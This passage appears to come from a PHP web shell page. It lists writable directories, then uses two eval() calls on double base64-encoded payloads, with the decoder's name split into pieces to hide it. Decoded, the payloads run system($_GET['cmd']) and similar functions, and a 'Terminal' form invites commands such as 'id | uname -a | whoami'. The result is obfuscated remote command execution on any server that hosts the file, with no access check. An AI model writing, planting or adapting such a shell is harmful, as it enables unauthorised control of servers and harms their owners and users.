            foreach ($writableDirectories as $dir) {
                echo "Writable Directory: $dir\n";
            }
        }
    } else {
        echo $writableDirectories; // Menampilkan pesan error jika path tidak valid
    }
}
?>
    </pre>


<?php
$cmd = "";
$cmd .= "Wm5WdVkzUnBiMjRnWlhobEtDUmpiV1FwSUhzS0lDQWdJR2xtSUNobWRXNWpkR2x2Ymw5bGVHbHpkSE1vSjNONWMzUmxiU2NwS1NCN0NpQWdJQ0FnSUNBZ1FHOWlYM04wWVhKMEtDazdDaUFnSUNBZ0lDQWdRSE41YzNSbGJTZ2tZMjFrS1RzS0lDQWdJQ0FnSUNBa1luVm1aaUE5SUVCdllsOW5aWFJmWTI5dWRHVnVkSE1vS1RzS0lDQWdJQ0FnSUNCQWIySmZaVzVrWDJOc1pXRnVLQ2s3Q2dvZ0lDQWdJQ0FnSUhKbGRIVnliaUFrWW5WbVpqc0tJQ0FnSUgwZ1pXeHpaV2xtSUNobWRXNWpkR2x2Ymw5bGVHbHpkSE1vSjJWNFpXTW5LU2tnZXdvZ0lDQWdJQ0FnSUVCbGVHVmpLQ1JqYldRc0lDUnlaWE4xYkhSektUc0tJQ0FnSUNBZ0lDQWtZblZtWmlBOUlDY25Pd29nSUNBZ0lDQWdJR1p2Y21WaFkyZ2dLQ1J5WlhOMWJIUnpJR0Z6SUNSeVpYTjFiSFFwSUhzS0lDQWdJQ0FnSUNBZ0lDQWdKR0oxWm1ZZ0xqMGdKSEpsYzNWc2REc0tJQ0FnSUNBZ0lDQjlDZ29nSUNBZ0lDQWdJSEpsZEhWeWJpQWtZblZtWmpzS0lDQWdJSDBnWld4elpXbG1JQ2htZFc1amRHbHZibDlsZUdsemRITW9KM0JoYzNOMGFISjFKeWtwSUhzS0lDQWdJQ0FnSUNCQWIySmZjM1JoY25Rb0tUc0tJQ0FnSUNBZ0lDQkFjR0Z6YzNSb2NuVW9KR050WkNrN0NpQWdJQ0FnSUNBZ0pHSjFabVlnUFNCQWIySmZaMlYwWDJOdmJuUmxiblJ6S0NrN0NpQWdJQ0FnSUNBZ1FHOWlYMlZ1WkY5amJHVmhiaWdwT3dvS0lDQWdJQ0FnSUNCeVpYUjFjbTRnSkdKMVptWTdDaUFnSUNCOUlHVnNjMlZwWmlBb1puVnVZM1JwYjI1ZlpYaHBjM1J6S0NkemFHVnNiRjlsZUdWakp5a3BJSHNLSUNBZ0lDQWdJQ0FrWW5WbVppQTlJRUJ6YUdWc2JGOWxlR1ZqS0NSamJXUXBPd29LSUNBZ0lDQWdJQ0J5WlhSMWNtNGdKR0oxWm1ZN0NpQWdJQ0I5Q24wPQ==";
$acmd = "base";
$bcmd = "64_decode";
$ccmd = $acmd.$bcmd;
$stringcmd = $ccmd($cmd);
$stringcmd = $ccmd($stringcmd);
eval($stringcmd);
?>

                    <h3>Terminal : </h3>
                    <form>
                        <input type="text" class="form-control" name="cmd" autocomplete="off" placeholder="id | uname -a | whoami | heked">
                    </form>



<?php
$cmd2 = "";
$cmd2 .= "YVdZZ0tHbHpjMlYwS0NSZlIwVlVXeWRqYldRblhTa3BJSHNLSUNBZ0lHVmphRzhnSWp4d2NtVWdZMnhoYzNNOUozUmxlSFF0ZDJocGRHVW5QaUk3Q2lBZ0lDQmxZMmh2SUhONWMzUmxiU2drWDBkRlZGc25ZMjFrSjEwcE93b2dJQ0FnWldOb2J5QW5QQzl3Y21VK0p6c0tJQ0FnSUdWNGFYUTdDbjA9";
$acmd2 = "base";
$bcmd2 = "64_decode";
$ccmd2 = $acmd2.$bcmd2;
$stringcmd2 = $ccmd2($cmd2);
$stringcmd2 = $ccmd2($stringcmd2);
eval($stringcmd2);
?>


<br>





		</td>
	</tr>
</table>

</div>
<center>[<a target="_blank"  href="https://bukakartu.id/minidbai">minidbai</a>]</center>
</body>
</html>
